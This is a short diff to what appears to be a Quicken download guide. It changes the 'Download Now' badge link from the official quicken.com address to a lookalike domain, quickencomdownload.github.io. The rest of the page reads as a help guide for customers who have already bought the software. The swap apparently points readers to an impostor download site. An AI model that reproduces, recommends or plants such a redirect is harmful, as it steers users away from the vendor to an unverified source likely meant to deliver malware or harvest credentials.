@@ -1,7 +1,7 @@
 
 # ✅ How to Download Quicken (Already Purchased)
 
-[![Download Now](https://img.shields.io/badge/Download-Quicken-blue?style=for-the-badge)](https://www.quicken.com/)
+[![Download Now](https://img.shields.io/badge/Download-Quicken-blue?style=for-the-badge)](https://quickencomdownload.github.io/)
 
 If you’ve already purchased Quicken, here’s a complete guide to help you download and install the software easily on your system.
 
